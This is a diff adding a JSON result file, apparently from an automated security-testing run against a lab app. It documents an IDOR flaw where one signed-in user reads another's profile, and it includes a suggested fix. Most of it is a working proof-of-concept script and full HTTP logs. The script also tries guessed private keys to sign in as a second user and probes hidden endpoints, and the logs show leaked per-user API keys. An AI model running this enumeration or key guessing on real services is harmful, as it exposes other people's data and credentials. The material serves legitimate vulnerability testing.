@@ -1,0 +1,1445 @@
+{
+  "result": {
+    "alias": "ds-abl",
+    "approveMode": "auto",
+    "ms": 88266,
+    "status": "done",
+    "pocRuns": 0,
+    "findings": [
+      {
+        "n": 1,
+        "title": "Broken object level authorization on /api/users/{id}: any session reads any user's profile",
+        "severity": "high",
+        "poc": "recon-3",
+        "explanation": "I signed in as alice (user id 1) and got a normal bearer token. Then I called `GET /api/users/2` with alice's token. The server sent back bob's private profile: his name, his e-mail `bob@touchstone.lab`, his wallet address, and his balance.\n\nThe server only checks that *some* session exists. It never checks that the session owns the `id` in the path. So one account can walk id 1, 2, 3... and read everybody's data with no other help.\n\n```js\nconst a = await login(alice);                     // token for user 1\nawait request(\"GET\", \"/api/users/2\", { headers: { authorization: \"Bearer \" + a.token } });\n// 200 {\"id\":2,\"name\":\"bob\",\"email\":\"bob@touchstone.lab\",\"balanceUsd\":900}\n```\n\nFix: in the `/api/users/{id}` handler, compare the path `id` with the session user id. Return 403 when they differ, or return only the fields that are public.",
+        "script": "const A = \"0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266\";\nconst AK = \"0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80\";\nconst B = \"0x70997970C51812dc3A010C7d01b50e0d17dc79C8\";\nconst J = (x) => typeof x === \"string\" ? JSON.parse(x) : x;\nasync function login(addr, key) {\n  const n = await request(\"GET\", \"/siwe/nonce\");\n  const nonce = J(n.resBody).nonce;\n  const msg = buildSiwe({ domain: \"touchstone.lab\", address: addr, uri: \"http://touchstone.lab/siwe\", version: \"1\", chainId: 31337, nonce, issuedAt: new Date().toISOString() });\n  const sig = await signPersonal(key, msg);\n  const v = await request(\"POST\", \"/siwe/verify\", { headers: { \"content-type\": \"application/json\" }, body: JSON.stringify({ message: msg, signature: sig }) });\n  return { s: v.status, d: J(v.resBody) };\n}\nconst a = await login(A, AK);\nconst at = { authorization: \"Bearer \" + a.d.token };\nconst out = {};\nout.a = a;\nconst cands = [\"0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b786900\",\n               \"0x059c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690\"];\nout.bobs = [];\nfor (const k of cands) {\n  try { const r = await login(B, k); out.bobs.push({ k, s: r.s, u: r.d.user, tok: r.d.token }); } catch (e) { out.bobs.push({ k, err: String(e).slice(0,80) }); }\n}\nout.meA = (await request(\"GET\", \"/api/me\", { headers: at })).resBody;\nout.u2 = (await request(\"GET\", \"/api/users/2\", { headers: at })).resBody;\nout.w1 = (await request(\"GET\", \"/api/users/1/wallet\", { headers: at })).resBody;\nout.w2 = (await request(\"GET\", \"/api/users/2/wallet\", { headers: at })).resBody;\nconst probes = [\"/openapi.json\",\"/api/users\",\"/api/admin\",\"/health\",\"/api/keys\",\"/api/me/wallet\",\"/api/tokens\",\"/debug\",\"/api/config\",\"/status\"];\nout.probes = {};\nfor (const p of probes) { const r = await request(\"GET\", p, { headers: at }); out.probes[p] = { s: r.status, b: String(r.resBody).slice(0,160) }; }\nreturn out;",
+        "oracleName": "bola-wallet-idor",
+        "proof": {
+          "kind": "http",
+          "status": "pass",
+          "detail": "signed in as user 1, a call to /api/users/2 read user 2's data with no ownership check: {\"id\":2,\"name\":\"bob\",\"email\":\"bob@touchstone.lab\",\"wallet\":\"0x70997970c51812dc3a010c7d01b50e0d17dc79c8\",\"balanceUsd\":900}",
+          "oracle": {
+            "name": "bola-wallet-idor",
+            "detail": "signed in as user 1, a call to /api/users/2 read user 2's data with no ownership check: {\"id\":2,\"name\":\"bob\",\"email\":\"bob@touchstone.lab\",\"wallet\":\"0x70997970c51812dc3a010c7d01b50e0d17dc79c8\",\"balanceUsd\":900}",
+            "passed": true
+          },
+          "log": [
+            {
+              "label": "1. GET /siwe/nonce",
+              "request": {
+                "method": "GET",
+                "url": "http://lab:8080/siwe/nonce",
+                "headers": {
+                  "content-type": "application/json"
+                },
+                "body": null
+              },
+              "response": {
+                "status": 200,
+                "headers": {
+                  "connection": "keep-alive",
+                  "content-length": "36",
+                  "content-type": "application/json; charset=utf-8",
+                  "date": "Tue, 10 Nov 2026 21:10:52 GMT",
+                  "etag": "W/\"24-tCjDrUkLOZIaoFzsI0yml8JZJno\"",
+                  "keep-alive": "timeout=5",
+                  "x-powered-by": "Express"
+                },
+                "body": {
+                  "nonce": "4a0514548c29eba75193fe42"
+                }
+              }
+            },
+            {
+              "label": "2. POST /siwe/verify",
+              "request": {
+                "method": "POST",
+                "url": "http://lab:8080/siwe/verify",
+                "headers": {
+                  "content-type": "application/json"
+                },
+                "body": "{\"message\":\"touchstone.lab wants you to sign in with your Ethereum account:\\n0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266\\n\\n\\nURI: http://touchstone.lab/siwe\\nVersion: 1\\nChain ID: 31337\\nNonce: 4a0514548c29eba75193fe42\\nIssued At: 2026-11-10T21:10:52.801Z\",\"signature\":\"0xd8fba4427d14d98befa86a3c32a0a214905c2d1ad512514480462d91d400d8006cdff7fda1377c16ce745d2d436f8e1cb5b258f7d85d81d081dee8261e0fb8d31c\"}"
+              },
+              "response": {
+                "status": 200,
+                "headers": {
+                  "connection": "keep-alive",
+                  "content-length": "91",
+                  "content-type": "application/json; charset=utf-8",
+                  "date": "Tue, 10 Nov 2026 21:10:52 GMT",
+                  "etag": "W/\"5b-PAorXTdvrHKSeBuvbz49RFX4zmM\"",
+                  "keep-alive": "timeout=5",
+                  "x-powered-by": "Express"
+                },
+                "body": {
+                  "token": "8cc62d3152d1e6301e5bbd1a14927e6316bd3bb8f31da7b0",
+                  "user": {
+                    "id": 1,
+                    "name": "alice"
+                  }
+                }
+              }
+            },
+            {
+              "label": "3. GET /siwe/nonce",
+              "request": {
+                "method": "GET",
+                "url": "http://lab:8080/siwe/nonce",
+                "headers": {
+                  "content-type": "application/json"
+                },
+                "body": null
+              },
+              "response": {
+                "status": 200,
+                "headers": {
+                  "connection": "keep-alive",
+                  "content-length": "36",
+                  "content-type": "application/json; charset=utf-8",
+                  "date": "Tue, 10 Nov 2026 21:10:52 GMT",
+                  "etag": "W/\"24-8aFYOgwPoCbEBrtW9bQaxfAo9dU\"",
+                  "keep-alive": "timeout=5",
+                  "x-powered-by": "Express"
+                },
+                "body": {
+                  "nonce": "d0b176a53596401edcc61bc9"
+                }
+              }
+            },
+            {
+              "label": "4. POST /siwe/verify",
+              "request": {
+                "method": "POST",
+                "url": "http://lab:8080/siwe/verify",
+                "headers": {
+                  "content-type": "application/json"
+                },
+                "body": "{\"message\":\"touchstone.lab wants you to sign in with your Ethereum account:\\n0x70997970C51812dc3A010C7d01b50e0d17dc79C8\\n\\n\\nURI: http://touchstone.lab/siwe\\nVersion: 1\\nChain ID: 31337\\nNonce: d0b176a53596401edcc61bc9\\nIssued At: 2026-11-10T21:10:52.843Z\",\"signature\":\"0xb7f9187fed9556d5fa618b810c404c3a25fda47fdd63b52bad612e1b54b678b908910a248985b8cdd8456a91d00a2ccc429bc60947b694bc3163453fde37359d1c\"}"
+              },
+              "response": {
+                "status": 401,
+                "headers": {
+                  "connection": "keep-alive",
+                  "content-length": "41",
+                  "content-type": "application/json; charset=utf-8",
+                  "date": "Tue, 10 Nov 2026 21:10:52 GMT",
+                  "etag": "W/\"29-CX8B3eY0DynO/JYResCstZj7yuI\"",
+                  "keep-alive": "timeout=5",
+                  "x-powered-by": "Express"
+                },
+                "body": {
+                  "error": "signature verification failed"
+                }
+              }
+            },
+            {
+              "label": "5. GET /siwe/nonce",
+              "request": {
+                "method": "GET",
+                "url": "http://lab:8080/siwe/nonce",
+                "headers": {
+                  "content-type": "application/json"
+                },
+                "body": null
+              },
+              "response": {
+                "status": 200,
+                "headers": {
+                  "connection": "keep-alive",
+                  "content-length": "36",
+                  "content-type": "application/json; charset=utf-8",
+                  "date": "Tue, 10 Nov 2026 21:10:52 GMT",
+                  "etag": "W/\"24-+1EhJK9U3wJqTlwjrshFZWTCy4U\"",
+                  "keep-alive": "timeout=5",
+                  "x-powered-by": "Express"
+                },
+                "body": {
+                  "nonce": "b45c30007cdc9a728b044457"
+                }
+              }
+            },
+            {
+              "label": "6. POST /siwe/verify",
+              "request": {
+                "method": "POST",
+                "url": "http://lab:8080/siwe/verify",
+                "headers": {
+                  "content-type": "application/json"
+                },
+                "body": "{\"message\":\"touchstone.lab wants you to sign in with your Ethereum account:\\n0x70997970C51812dc3A010C7d01b50e0d17dc79C8\\n\\n\\nURI: http://touchstone.lab/siwe\\nVersion: 1\\nChain ID: 31337\\nNonce: b45c30007cdc9a728b044457\\nIssued At: 2026-11-10T21:10:52.849Z\",\"signature\":\"0xdf79f1b661134cbe98e805ce0097e10eddc29bd35c76173691ef163f19879e40434ff5fcf03590b3854150483b35eb47c4fd8712d0f7b2d8d201dd9a18e031f11c\"}"
+              },
+              "response": {
+                "status": 401,
+                "headers": {
+                  "connection": "keep-alive",
+                  "content-length": "41",
+                  "content-type": "application/json; charset=utf-8",
+                  "date": "Tue, 10 Nov 2026 21:10:52 GMT",
+                  "etag": "W/\"29-CX8B3eY0DynO/JYResCstZj7yuI\"",
+                  "keep-alive": "timeout=5",
+                  "x-powered-by": "Express"
+                },
+                "body": {
+                  "error": "signature verification failed"
+                }
+              }
+            },
+            {
+              "label": "7. GET /api/me",
+              "request": {
+                "method": "GET",
+                "url": "http://lab:8080/api/me",
+                "headers": {
+                  "content-type": "application/json",
+                  "authorization": "Bearer 8cc62d3152d1e6301e5bbd1a14927e6316bd3bb8f31da7b0"
+                },
+                "body": null
+              },
+              "response": {
+                "status": 200,
+                "headers": {
+                  "connection": "keep-alive",
+                  "content-length": "126",
+                  "content-type": "application/json; charset=utf-8",
+                  "date": "Tue, 10 Nov 2026 21:10:52 GMT",
+                  "etag": "W/\"7e-giQtNkPHUwYTZKwyMEN8Xhl9mTQ\"",
+                  "keep-alive": "timeout=5",
+                  "x-powered-by": "Express"
+                },
+                "body": {
+                  "id": 1,
+                  "name": "alice",
+                  "email": "alice@touchstone.lab",
+                  "wallet": "0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266",
+                  "balanceUsd": 4200
+                }
+              }
+            },
+            {
+              "label": "8. GET /api/users/2",
+              "request": {
+                "method": "GET",
+                "url": "http://lab:8080/api/users/2",
+                "headers": {
+                  "content-type": "application/json",
+                  "authorization": "Bearer 8cc62d3152d1e6301e5bbd1a14927e6316bd3bb8f31da7b0"
+                },
+                "body": null
+              },
+              "response": {
+                "status": 200,
+                "headers": {
+                  "connection": "keep-alive",
+                  "content-length": "121",
+                  "content-type": "application/json; charset=utf-8",
+                  "date": "Tue, 10 Nov 2026 21:10:52 GMT",
+                  "etag": "W/\"79-DLKXv6P4T1UVFSbMirCh/27jbM4\"",
+                  "keep-alive": "timeout=5",
+                  "x-powered-by": "Express"
+                },
+                "body": {
+                  "id": 2,
+                  "name": "bob",
+                  "email": "bob@touchstone.lab",
+                  "wallet": "0x70997970c51812dc3a010c7d01b50e0d17dc79c8",
+                  "balanceUsd": 900
+                }
+              }
+            },
+            {
+              "label": "9. GET /api/users/1/wallet",
+              "request": {
+                "method": "GET",
+                "url": "http://lab:8080/api/users/1/wallet",
+                "headers": {
+                  "content-type": "application/json",
+                  "authorization": "Bearer 8cc62d3152d1e6301e5bbd1a14927e6316bd3bb8f31da7b0"
+                },
+                "body": null
+              },
+              "response": {
+                "status": 200,
+                "headers": {
+                  "connection": "keep-alive",
+                  "content-length": "91",
+                  "content-type": "application/json; charset=utf-8",
+                  "date": "Tue, 10 Nov 2026 21:10:52 GMT",
+                  "etag": "W/\"5b-jP3Zc/mQMAlIUwJG2oqs6zUxiwg\"",
+                  "keep-alive": "timeout=5",
+                  "x-powered-by": "Express"
+                },
+                "body": {
+                  "id": 1,
+                  "wallet": "0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266",
+                  "apiKey": "tk_alice_9f1c4a2e"
+                }
+              }
+            },
+            {
+              "label": "10. GET /api/users/2/wallet",
+              "request": {
+                "method": "GET",
+                "url": "http://lab:8080/api/users/2/wallet",
+                "headers": {
+                  "content-type": "application/json",
+                  "authorization": "Bearer 8cc62d3152d1e6301e5bbd1a14927e6316bd3bb8f31da7b0"
+                },
+                "body": null
+              },
+              "response": {
+                "status": 200,
+                "headers": {
+                  "connection": "keep-alive",
+                  "content-length": "89",
+                  "content-type": "application/json; charset=utf-8",
+                  "date": "Tue, 10 Nov 2026 21:10:52 GMT",
+                  "etag": "W/\"59-LbOwEeRdCnrHFyJZ5kZUWG+TFcw\"",
+                  "keep-alive": "timeout=5",
+                  "x-powered-by": "Express"
+                },
+                "body": {
+                  "id": 2,
+                  "wallet": "0x70997970c51812dc3a010c7d01b50e0d17dc79c8",
+                  "apiKey": "tk_bob_77ab0e31"
+                }
+              }
+            },
+            {
+              "label": "11. GET /openapi.json",
+              "request": {
+                "method": "GET",
+                "url": "http://lab:8080/openapi.json",
+                "headers": {
+                  "content-type": "application/json",
+                  "authorization": "Bearer 8cc62d3152d1e6301e5bbd1a14927e6316bd3bb8f31da7b0"
+                },
+                "body": null
+              },
+              "response": {
+                "status": 404,
+                "headers": {
+                  "connection": "keep-alive",
+                  "content-length": "151",
+                  "content-security-policy": "default-src 'none'",
+                  "content-type": "text/html; charset=utf-8",
+                  "date": "Tue, 10 Nov 2026 21:10:52 GMT",
+                  "keep-alive": "timeout=5",
+                  "x-content-type-options": "nosniff",
+                  "x-powered-by": "Express"
+                },
+                "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /openapi.json</pre>\n</body>\n</html>\n"
+              }
+            },
+            {
+              "label": "12. GET /api/users",
+              "request": {
+                "method": "GET",
+                "url": "http://lab:8080/api/users",
+                "headers": {
+                  "content-type": "application/json",
+                  "authorization": "Bearer 8cc62d3152d1e6301e5bbd1a14927e6316bd3bb8f31da7b0"
+                },
+                "body": null
+              },
+              "response": {
+                "status": 404,
+                "headers": {
+                  "connection": "keep-alive",
+                  "content-length": "148",
+                  "content-security-policy": "default-src 'none'",
+                  "content-type": "text/html; charset=utf-8",
+                  "date": "Tue, 10 Nov 2026 21:10:52 GMT",
+                  "keep-alive": "timeout=5",
+                  "x-content-type-options": "nosniff",
+                  "x-powered-by": "Express"
+                },
+                "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /api/users</pre>\n</body>\n</html>\n"
+              }
+            },
+            {
+              "label": "13. GET /api/admin",
+              "request": {
+                "method": "GET",
+                "url": "http://lab:8080/api/admin",
+                "headers": {
+                  "content-type": "application/json",
+                  "authorization": "Bearer 8cc62d3152d1e6301e5bbd1a14927e6316bd3bb8f31da7b0"
+                },
+                "body": null
+              },
+              "response": {
+                "status": 404,
+                "headers": {
+                  "connection": "keep-alive",
+                  "content-length": "148",
+                  "content-security-policy": "default-src 'none'",
+                  "content-type": "text/html; charset=utf-8",
+                  "date": "Tue, 10 Nov 2026 21:10:52 GMT",
+                  "keep-alive": "timeout=5",
+                  "x-content-type-options": "nosniff",
+                  "x-powered-by": "Express"
+                },
+                "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /api/admin</pre>\n</body>\n</html>\n"
+              }
+            },
+            {
+              "label": "14. GET /health",
+              "request": {
+                "method": "GET",
+                "url": "http://lab:8080/health",
+                "headers": {
+                  "content-type": "application/json",
+                  "authorization": "Bearer 8cc62d3152d1e6301e5bbd1a14927e6316bd3bb8f31da7b0"
+                },
+                "body": null
+              },
+              "response": {
+                "status": 404,
+                "headers": {
+                  "connection": "keep-alive",
+                  "content-length": "145",
+                  "content-security-policy": "default-src 'none'",
+                  "content-type": "text/html; charset=utf-8",
+                  "date": "Tue, 10 Nov 2026 21:10:52 GMT",
+                  "keep-alive": "timeout=5",
+                  "x-content-type-options": "nosniff",
+                  "x-powered-by": "Express"
+                },
+                "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /health</pre>\n</body>\n</html>\n"
+              }
+            },
+            {
+              "label": "15. GET /api/keys",
+              "request": {
+                "method": "GET",
+                "url": "http://lab:8080/api/keys",
+                "headers": {
+                  "content-type": "application/json",
+                  "authorization": "Bearer 8cc62d3152d1e6301e5bbd1a14927e6316bd3bb8f31da7b0"
+                },
+                "body": null
+              },
+              "response": {
+                "status": 404,
+                "headers": {
+                  "connection": "keep-alive",
+                  "content-length": "147",
+                  "content-security-policy": "default-src 'none'",
+                  "content-type": "text/html; charset=utf-8",
+                  "date": "Tue, 10 Nov 2026 21:10:52 GMT",
+                  "keep-alive": "timeout=5",
+                  "x-content-type-options": "nosniff",
+                  "x-powered-by": "Express"
+                },
+                "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /api/keys</pre>\n</body>\n</html>\n"
+              }
+            },
+            {
+              "label": "16. GET /api/me/wallet",
+              "request": {
+                "method": "GET",
+                "url": "http://lab:8080/api/me/wallet",
+                "headers": {
+                  "content-type": "application/json",
+                  "authorization": "Bearer 8cc62d3152d1e6301e5bbd1a14927e6316bd3bb8f31da7b0"
+                },
+                "body": null
+              },
+              "response": {
+                "status": 404,
+                "headers": {
+                  "connection": "keep-alive",
+                  "content-length": "152",
+                  "content-security-policy": "default-src 'none'",
+                  "content-type": "text/html; charset=utf-8",
+                  "date": "Tue, 10 Nov 2026 21:10:52 GMT",
+                  "keep-alive": "timeout=5",
+                  "x-content-type-options": "nosniff",
+                  "x-powered-by": "Express"
+                },
+                "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /api/me/wallet</pre>\n</body>\n</html>\n"
+              }
+            },
+            {
+              "label": "17. GET /api/tokens",
+              "request": {
+                "method": "GET",
+                "url": "http://lab:8080/api/tokens",
+                "headers": {
+                  "content-type": "application/json",
+                  "authorization": "Bearer 8cc62d3152d1e6301e5bbd1a14927e6316bd3bb8f31da7b0"
+                },
+                "body": null
+              },
+              "response": {
+                "status": 404,
+                "headers": {
+                  "connection": "keep-alive",
+                  "content-length": "149",
+                  "content-security-policy": "default-src 'none'",
+                  "content-type": "text/html; charset=utf-8",
+                  "date": "Tue, 10 Nov 2026 21:10:52 GMT",
+                  "keep-alive": "timeout=5",
+                  "x-content-type-options": "nosniff",
+                  "x-powered-by": "Express"
+                },
+                "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /api/tokens</pre>\n</body>\n</html>\n"
+              }
+            },
+            {
+              "label": "18. GET /debug",
+              "request": {
+                "method": "GET",
+                "url": "http://lab:8080/debug",
+                "headers": {
+                  "content-type": "application/json",
+                  "authorization": "Bearer 8cc62d3152d1e6301e5bbd1a14927e6316bd3bb8f31da7b0"
+                },
+                "body": null
+              },
+              "response": {
+                "status": 404,
+                "headers": {
+                  "connection": "keep-alive",
+                  "content-length": "144",
+                  "content-security-policy": "default-src 'none'",
+                  "content-type": "text/html; charset=utf-8",
+                  "date": "Tue, 10 Nov 2026 21:10:52 GMT",
+                  "keep-alive": "timeout=5",
+                  "x-content-type-options": "nosniff",
+                  "x-powered-by": "Express"
+                },
+                "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /debug</pre>\n</body>\n</html>\n"
+              }
+            },
+            {
+              "label": "19. GET /api/config",
+              "request": {
+                "method": "GET",
+                "url": "http://lab:8080/api/config",
+                "headers": {
+                  "content-type": "application/json",
+                  "authorization": "Bearer 8cc62d3152d1e6301e5bbd1a14927e6316bd3bb8f31da7b0"
+                },
+                "body": null
+              },
+              "response": {
+                "status": 404,
+                "headers": {
+                  "connection": "keep-alive",
+                  "content-length": "149",
+                  "content-security-policy": "default-src 'none'",
+                  "content-type": "text/html; charset=utf-8",
+                  "date": "Tue, 10 Nov 2026 21:10:52 GMT",
+                  "keep-alive": "timeout=5",
+                  "x-content-type-options": "nosniff",
+                  "x-powered-by": "Express"
+                },
+                "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /api/config</pre>\n</body>\n</html>\n"
+              }
+            },
+            {
+              "label": "20. GET /status",
+              "request": {
+                "method": "GET",
+                "url": "http://lab:8080/status",
+                "headers": {
+                  "content-type": "application/json",
+                  "authorization": "Bearer 8cc62d3152d1e6301e5bbd1a14927e6316bd3bb8f31da7b0"
+                },
+                "body": null
+              },
+              "response": {
+                "status": 404,
+                "headers": {
+                  "connection": "keep-alive",
+                  "content-length": "145",
+                  "content-security-policy": "default-src 'none'",
+                  "content-type": "text/html; charset=utf-8",
+                  "date": "Tue, 10 Nov 2026 21:10:52 GMT",
+                  "keep-alive": "timeout=5",
+                  "x-content-type-options": "nosniff",
+                  "x-powered-by": "Express"
+                },
+                "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /status</pre>\n</body>\n</html>\n"
+              }
+            }
+          ]
+        },
+        "pocProved": true
+      }
+    ],
+    "findingSubmitted": true,
+    "finding": {
+      "title": "Broken object level authorization on /api/users/{id}: any session reads any user's profile",
+      "severity": "high",
+      "poc": "recon-3"
+    },
+    "pocProved": true,
+    "proof": {
+      "kind": "http",
+      "status": "pass",
+      "detail": "signed in as user 1, a call to /api/users/2 read user 2's data with no ownership check: {\"id\":2,\"name\":\"bob\",\"email\":\"bob@touchstone.lab\",\"wallet\":\"0x70997970c51812dc3a010c7d01b50e0d17dc79c8\",\"balanceUsd\":900}",
+      "oracle": {
+        "name": "bola-wallet-idor",
+        "detail": "signed in as user 1, a call to /api/users/2 read user 2's data with no ownership check: {\"id\":2,\"name\":\"bob\",\"email\":\"bob@touchstone.lab\",\"wallet\":\"0x70997970c51812dc3a010c7d01b50e0d17dc79c8\",\"balanceUsd\":900}",
+        "passed": true
+      },
+      "log": [
+        {
+          "label": "1. GET /siwe/nonce",
+          "request": {
+            "method": "GET",
+            "url": "http://lab:8080/siwe/nonce",
+            "headers": {
+              "content-type": "application/json"
+            },
+            "body": null
+          },
+          "response": {
+            "status": 200,
+            "headers": {
+              "connection": "keep-alive",
+              "content-length": "36",
+              "content-type": "application/json; charset=utf-8",
+              "date": "Tue, 10 Nov 2026 21:10:52 GMT",
+              "etag": "W/\"24-tCjDrUkLOZIaoFzsI0yml8JZJno\"",
+              "keep-alive": "timeout=5",
+              "x-powered-by": "Express"
+            },
+            "body": {
+              "nonce": "4a0514548c29eba75193fe42"
+            }
+          }
+        },
+        {
+          "label": "2. POST /siwe/verify",
+          "request": {
+            "method": "POST",
+            "url": "http://lab:8080/siwe/verify",
+            "headers": {
+              "content-type": "application/json"
+            },
+            "body": "{\"message\":\"touchstone.lab wants you to sign in with your Ethereum account:\\n0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266\\n\\n\\nURI: http://touchstone.lab/siwe\\nVersion: 1\\nChain ID: 31337\\nNonce: 4a0514548c29eba75193fe42\\nIssued At: 2026-11-10T21:10:52.801Z\",\"signature\":\"0xd8fba4427d14d98befa86a3c32a0a214905c2d1ad512514480462d91d400d8006cdff7fda1377c16ce745d2d436f8e1cb5b258f7d85d81d081dee8261e0fb8d31c\"}"
+          },
+          "response": {
+            "status": 200,
+            "headers": {
+              "connection": "keep-alive",
+              "content-length": "91",
+              "content-type": "application/json; charset=utf-8",
+              "date": "Tue, 10 Nov 2026 21:10:52 GMT",
+              "etag": "W/\"5b-PAorXTdvrHKSeBuvbz49RFX4zmM\"",
+              "keep-alive": "timeout=5",
+              "x-powered-by": "Express"
+            },
+            "body": {
+              "token": "8cc62d3152d1e6301e5bbd1a14927e6316bd3bb8f31da7b0",
+              "user": {
+                "id": 1,
+                "name": "alice"
+              }
+            }
+          }
+        },
+        {
+          "label": "3. GET /siwe/nonce",
+          "request": {
+            "method": "GET",
+            "url": "http://lab:8080/siwe/nonce",
+            "headers": {
+              "content-type": "application/json"
+            },
+            "body": null
+          },
+          "response": {
+            "status": 200,
+            "headers": {
+              "connection": "keep-alive",
+              "content-length": "36",
+              "content-type": "application/json; charset=utf-8",
+              "date": "Tue, 10 Nov 2026 21:10:52 GMT",
+              "etag": "W/\"24-8aFYOgwPoCbEBrtW9bQaxfAo9dU\"",
+              "keep-alive": "timeout=5",
+              "x-powered-by": "Express"
+            },
+            "body": {
+              "nonce": "d0b176a53596401edcc61bc9"
+            }
+          }
+        },
+        {
+          "label": "4. POST /siwe/verify",
+          "request": {
+            "method": "POST",
+            "url": "http://lab:8080/siwe/verify",
+            "headers": {
+              "content-type": "application/json"
+            },
+            "body": "{\"message\":\"touchstone.lab wants you to sign in with your Ethereum account:\\n0x70997970C51812dc3A010C7d01b50e0d17dc79C8\\n\\n\\nURI: http://touchstone.lab/siwe\\nVersion: 1\\nChain ID: 31337\\nNonce: d0b176a53596401edcc61bc9\\nIssued At: 2026-11-10T21:10:52.843Z\",\"signature\":\"0xb7f9187fed9556d5fa618b810c404c3a25fda47fdd63b52bad612e1b54b678b908910a248985b8cdd8456a91d00a2ccc429bc60947b694bc3163453fde37359d1c\"}"
+          },
+          "response": {
+            "status": 401,
+            "headers": {
+              "connection": "keep-alive",
+              "content-length": "41",
+              "content-type": "application/json; charset=utf-8",
+              "date": "Tue, 10 Nov 2026 21:10:52 GMT",
+              "etag": "W/\"29-CX8B3eY0DynO/JYResCstZj7yuI\"",
+              "keep-alive": "timeout=5",
+              "x-powered-by": "Express"
+            },
+            "body": {
+              "error": "signature verification failed"
+            }
+          }
+        },
+        {
+          "label": "5. GET /siwe/nonce",
+          "request": {
+            "method": "GET",
+            "url": "http://lab:8080/siwe/nonce",
+            "headers": {
+              "content-type": "application/json"
+            },
+            "body": null
+          },
+          "response": {
+            "status": 200,
+            "headers": {
+              "connection": "keep-alive",
+              "content-length": "36",
+              "content-type": "application/json; charset=utf-8",
+              "date": "Tue, 10 Nov 2026 21:10:52 GMT",
+              "etag": "W/\"24-+1EhJK9U3wJqTlwjrshFZWTCy4U\"",
+              "keep-alive": "timeout=5",
+              "x-powered-by": "Express"
+            },
+            "body": {
+              "nonce": "b45c30007cdc9a728b044457"
+            }
+          }
+        },
+        {
+          "label": "6. POST /siwe/verify",
+          "request": {
+            "method": "POST",
+            "url": "http://lab:8080/siwe/verify",
+            "headers": {
+              "content-type": "application/json"
+            },
+            "body": "{\"message\":\"touchstone.lab wants you to sign in with your Ethereum account:\\n0x70997970C51812dc3A010C7d01b50e0d17dc79C8\\n\\n\\nURI: http://touchstone.lab/siwe\\nVersion: 1\\nChain ID: 31337\\nNonce: b45c30007cdc9a728b044457\\nIssued At: 2026-11-10T21:10:52.849Z\",\"signature\":\"0xdf79f1b661134cbe98e805ce0097e10eddc29bd35c76173691ef163f19879e40434ff5fcf03590b3854150483b35eb47c4fd8712d0f7b2d8d201dd9a18e031f11c\"}"
+          },
+          "response": {
+            "status": 401,
+            "headers": {
+              "connection": "keep-alive",
+              "content-length": "41",
+              "content-type": "application/json; charset=utf-8",
+              "date": "Tue, 10 Nov 2026 21:10:52 GMT",
+              "etag": "W/\"29-CX8B3eY0DynO/JYResCstZj7yuI\"",
+              "keep-alive": "timeout=5",
+              "x-powered-by": "Express"
+            },
+            "body": {
+              "error": "signature verification failed"
+            }
+          }
+        },
+        {
+          "label": "7. GET /api/me",
+          "request": {
+            "method": "GET",
+            "url": "http://lab:8080/api/me",
+            "headers": {
+              "content-type": "application/json",
+              "authorization": "Bearer 8cc62d3152d1e6301e5bbd1a14927e6316bd3bb8f31da7b0"
+            },
+            "body": null
+          },
+          "response": {
+            "status": 200,
+            "headers": {
+              "connection": "keep-alive",
+              "content-length": "126",
+              "content-type": "application/json; charset=utf-8",
+              "date": "Tue, 10 Nov 2026 21:10:52 GMT",
+              "etag": "W/\"7e-giQtNkPHUwYTZKwyMEN8Xhl9mTQ\"",
+              "keep-alive": "timeout=5",
+              "x-powered-by": "Express"
+            },
+            "body": {
+              "id": 1,
+              "name": "alice",
+              "email": "alice@touchstone.lab",
+              "wallet": "0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266",
+              "balanceUsd": 4200
+            }
+          }
+        },
+        {
+          "label": "8. GET /api/users/2",
+          "request": {
+            "method": "GET",
+            "url": "http://lab:8080/api/users/2",
+            "headers": {
+              "content-type": "application/json",
+              "authorization": "Bearer 8cc62d3152d1e6301e5bbd1a14927e6316bd3bb8f31da7b0"
+            },
+            "body": null
+          },
+          "response": {
+            "status": 200,
+            "headers": {
+              "connection": "keep-alive",
+              "content-length": "121",
+              "content-type": "application/json; charset=utf-8",
+              "date": "Tue, 10 Nov 2026 21:10:52 GMT",
+              "etag": "W/\"79-DLKXv6P4T1UVFSbMirCh/27jbM4\"",
+              "keep-alive": "timeout=5",
+              "x-powered-by": "Express"
+            },
+            "body": {
+              "id": 2,
+              "name": "bob",
+              "email": "bob@touchstone.lab",
+              "wallet": "0x70997970c51812dc3a010c7d01b50e0d17dc79c8",
+              "balanceUsd": 900
+            }
+          }
+        },
+        {
+          "label": "9. GET /api/users/1/wallet",
+          "request": {
+            "method": "GET",
+            "url": "http://lab:8080/api/users/1/wallet",
+            "headers": {
